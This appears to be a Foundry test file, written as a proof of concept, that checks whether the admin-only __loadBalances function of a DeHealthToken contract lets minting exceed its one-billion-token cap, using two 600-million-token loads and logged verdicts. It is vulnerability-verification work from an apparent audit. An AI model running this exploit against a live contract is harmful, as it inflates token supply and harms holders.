// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/DeHealthToken.sol";

contract DeHealthTokenTest is Test {
    DeHealthToken token;
    address admin;

    function setUp() public {
        // Set up admin address
        admin = address(0x1);
        // Deploy token contract
        token = new DeHealthToken();
        // Initialize token with admin role
        token.initialize(admin);
    }

    // Test that __loadBalances() allows minting beyond token cap
    function test_ExceedTokenCap_BeforeActivation() public {
        uint256 initialCap = 1_000_000_000 * 10**token.decimals();
        
        // BEFORE CRITICAL OPERATIONS
        console.log("--- BEFORE First loadBalances ---");
        uint256 totalSupplyBefore = token.totalSupply();
        console.log("Initial Total Supply:", totalSupplyBefore);
        console.log("Initial Cap:", initialCap);

        // FIRST LOAD (600_000_000 tokens)
        vm.startPrank(admin);
        address[] memory firstAddresses = new address[](1);
        firstAddresses[0] = address(0x2);
        uint256[] memory firstBalances = new uint256[](1);
        firstBalances[0] = 600_000_000 * (10 ** token.decimals());
        token.__loadBalances(firstAddresses, firstBalances);
        vm.stopPrank();

        console.log("--- AFTER First loadBalances ---");
        uint256 totalSupplyAfterFirst = token.totalSupply();
        console.log("Total Supply after first load:", totalSupplyAfterFirst);
        assertGt(totalSupplyAfterFirst, totalSupplyBefore, "Supply should increase after first load");
        assertLe(totalSupplyAfterFirst, initialCap, "Supply under cap after first load");

        // SECOND LOAD - CRITICAL VULNERABILITY ACTION
        console.log("--- TRIGGERING SECOND loadBalances (EXPLOIT) ---");
        
        // State BEFORE vulnerability trigger
        console.log("--- BEFORE Second loadBalances ---");
        uint256 totalSupplyBeforeSecond = token.totalSupply();
        console.log("Total Supply before second load:", totalSupplyBeforeSecond);
        
        // ATTACK: Execute second loadBalances (600m more tokens)
        vm.startPrank(admin);
        address[] memory secondAddresses = new address[](1);
        secondAddresses[0] = address(0x3);
        uint256[] memory secondBalances = new uint256[](1);
        secondBalances[0] = 600_000_000 * (10 ** token.decimals());
        token.__loadBalances(secondAddresses, secondBalances);
        vm.stopPrank();

        // AFTER CRITICAL OPERATIONS
        console.log("--- AFTER Second loadBalances ---");
        uint256 totalSupplyAfterSecond = token.totalSupply();
        console.log("Total Supply after exploit:", totalSupplyAfterSecond);

        // DIFFERENTIAL VALIDATION
        bool capExceeded = totalSupplyAfterSecond > initialCap;
        console.log("--- VULNERABILITY VERIFICATION ---");
        console.log("Final Supply vs Cap:", capExceeded ? "EXCEEDED (Vulnerability)" : "Respected (No Vulnerability)");
        console.log("Final Supply Change: ", totalSupplyAfterSecond);
        console.log("Expected cap:        ", initialCap);
        
        // FINAL VERDICT
        if (capExceeded) {
            console.log("Vulnerability Exists: token cap exceeded by second loadBalances");
        } else {
            console.log("Vulnerability not Exist: token cap enforced correctly");
        }
    }
}